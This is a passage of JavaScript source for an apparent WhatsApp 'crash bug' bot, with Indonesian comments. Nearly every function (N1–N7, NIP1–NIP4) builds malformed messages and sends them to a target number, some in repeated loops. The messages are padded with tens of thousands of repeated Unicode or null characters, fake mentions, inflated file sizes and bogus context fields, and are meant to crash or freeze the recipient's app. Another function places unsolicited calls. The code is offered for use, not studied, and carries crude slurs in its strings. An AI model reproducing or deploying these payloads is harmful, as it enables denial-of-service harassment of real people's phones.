                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

//vamp funct
async function SCVIP999(target) {
    // Inisialisasi koneksi dengan makeWASocket
    const sock = makeWASocket({
        printQRInTerminal: false, // QR code tidak perlu ditampilkan
    });

    try {
        console.log(`📞 Mengirim panggilan ke ${target}`);

        // Kirim permintaan panggilan
        await Aii.query({
            tag: 'call',
            json: ['action', 'call', 'call', { id: `${target}` }],
        });

        console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
    } catch (err) {
        console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
    } finally {
        Aii.ev.removeAllListeners(); // Hapus semua event listener
        Aii.ws.close(); // Tutup koneksi WebSocket
    }
}
async function N1(target, ptcp = true) {
  const jids = `_*~@8~*_\n`.repeat(10500);
  const ui = 'ꦽ'.repeat(55555);

  await Aii.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: 'Aku nak Coli' + ui + jids,
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}
async function N2(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "AmbatakumCrt." + "\u0000".repeat(77777) + "@8".repeat(77777),
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await Aii.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function N3(target, Ptcp = true) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Skibidi Bintang10." + "ꦽ".repeat(50000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: Aii.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "Vampire File",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "Persetan Dengan Cinta, Hidup Dalam Kegelapan.",
                },
                contentText: '༑ Crash Total - ( Draculaxtzy ) "👋"',
                footerText: "Di Dukung Oleh ©WhatsApp.",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(550000),
                    buttonText: {
                      displayText: "Oyyy Lu Gak teraweh yaaa??",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: CrashVamp,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/Whhwhahwha",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: 'Dracula?',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "©Originial_Bug",
              thumbnail: CrashVamp,
              sourceUrl: "Terawehsono",
              sourceId: "Dracula - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `Whahhhaa 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "P Ada dracula™",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await Aii.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}
async function N4(target, Ptcp = true) {
    let virtex = "Assalamualaikum" + "ꦾ".repeat(90000) + "@8".repeat(90000);
    await Aii.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "Wkwk.",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function N5(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "Jwab cuki" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0018".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Dracula",
                    },
                ],
            },
        };

        await Aii.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}
async function N6(target, Ptcp = true) {
  try {
    await Aii.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "Banggg Aku hamill‎‏‎‏‎‏⭑̤\n" +
                  "\u0018".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Dracula",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function N7(target, Ptcp = true) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Udah adzan bg." + "\u0000".repeat(50000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: Aii.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "Vampire File",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "Persetan Dengan Cinta, Hidup Dalam Kegelapan.",
                },
                contentText: '༑ Crash Total - ( Vampire_Official ) "👋"',
                footerText: "Di Dukung Oleh ©WhatsApp.",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(55000),
                    buttonText: {
                      displayText: "Vampire Crasher",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: CrashVamp,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/Vampiresagara",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! P',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "©Originial_Bug",
              thumbnail: CrashVamp,
              sourceUrl: "Tetaplah Menjadi Bodoh...",
              sourceId: "Dracula - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `Bakaa 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "By : Whhwhahwha™",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await Aii.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}
    async function NIP1(target) {
      try {
        await Aii.relayMessage(
          target,
          {
            extendedTextMessage: {
              text: "Draculaxtzy IOՏ̊‏‎‏‎‏‎‏⭑",
              contextInfo: {
                stanzaId: "1234567890ABCDEF",
                participant: target,
                quotedMessage: {
                  callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [
                      {
                        jid: target,
                        callOutcome: "1",
                      },
                    ],
                  },
                },
                remoteJid: target,
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 9999999,
                isForwarded: true,
                quotedAd: {
                  advertiserName: "Example Advertiser",
                  mediaType: "IMAGE",
                  jpegThumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  caption: "This is an ad caption",
                },
                placeholderKey: {
                  remoteJid: target,
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret:
                  "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                  title: "ᐯᗩᗰᑭIᖇᗴ IOՏ̊‏‎",
                  body: "ᐯᗩᗰᑭIᖇᗴ IOՏ‏‎",
                  mediaType: "VIDEO",
                  renderLargerThumbnail: true,
                  previewTtpe: "VIDEO",
                  thumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  sourceType: " x ",
                  sourceId: " x ",
                  sourceUrl: "https://wa.me/settings",
                  mediaUrl: "https://wa.me/settings",
                  containsAutoReply: true,
                  showAdAttribution: true,
                  ctwaClid: "ctwa_clid_example",
                  ref: "ref_example",
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                  url: "https://wa.me/settings",
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "6287888888888-1234567890@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                  utmSource: "utm_source_example",
                  utmCampaign: "utm_campaign_example",
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "6287888888888-1234567890@g.us",
                  serverMessageId: 1,
                  newsletterName: " X ",
                  contentType: "UPDATE",
                  accessibilityText: " X ",
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: "0@s.whatsapp.net",
                },
                smbClientCampaignId: "smb_client_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                  showMmDisclosure: true,
                },
              },
            },
          },
          {
            participant: { jid: target },
            userJid: target,
          }
        );
      } catch (err) {
        console.log(err);
      }
    }
async function NIP2(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "RizzGantengSholatYok" + "ી".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await Aii.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
        console.log(err);
    }
}
async function NIP3(target) {
Aii.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "Bangg??" + "ꦾ࣯࣯".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}
async function NIP4(target) {
Aii.relayMessage(
target,
{
  extendedTextMessage: {
    text: `iOS Crash` + "࣯ꦾ".repeat(90000),
    contextInfo: {
      fromMe: false,
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "draculaxios ‌" + "ꦾ".repeat(90000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}

async function DorVipIP1(target) {
for (let i = 0; i < 5; i++) {
await NIP1(target);
await NIP2(target);
await NIP3(target);
await NIP4(target);
}
};

async function DorVip1(target) {
for (let i = 0; i < 10; i++) {
await NVIP1(target);
await NVIP1(target);
await NVIP2(target);
await NVIP2(target);
await NVIP3(target);
await NVIP3(target);
await NVIP4(target);
await NVIP4(target);
await NVIP5(target);
await NVIP5(target);
}
};

async function DorVip3(target) {
for (let i = 0; i < 15; i++) {
await NVIP6(target);
await NVIP6(target);
await NVIP7(target);
await NVIP7(target);
await NVIP8(target);
await NVIP8(target);
await NVIP9(target);
await NVIP9(target);
}
};

async function DorVip2(target) {
for (let i = 0; i < 5; i++) {
await N1(target);
await N2(target);
await N3(target);
await N4(target);
await N5(target);
await N6(target);
await N7(target);
}
};
// --- Jalankan Bot ---
 
(async () => {
    console.clear();
    console.log("⟐ Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses Connected");
    bot.launch();

    // Membersihkan konsol sebelum menampilkan pesan sukses
    console.clear();
    console.log(chalk.bold.white(`\n
                          ⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
